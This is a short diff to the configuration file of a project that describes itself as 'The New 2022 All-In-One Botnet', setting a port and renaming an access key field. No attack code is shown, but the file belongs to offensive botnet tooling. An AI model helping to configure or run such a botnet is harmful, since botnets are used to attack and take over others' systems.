@@ -18,7 +18,7 @@ Net_Info {
     net_description = "The New 2022 All-In-One Botnet. Eliminating the hassle of looking for all botnet related files to start one up!"
     net_versoin = "4.0.0"
     net_port = 555
-    access_token = 122
+    skrillec_key = 122
 }
 DB {
     MySQL {
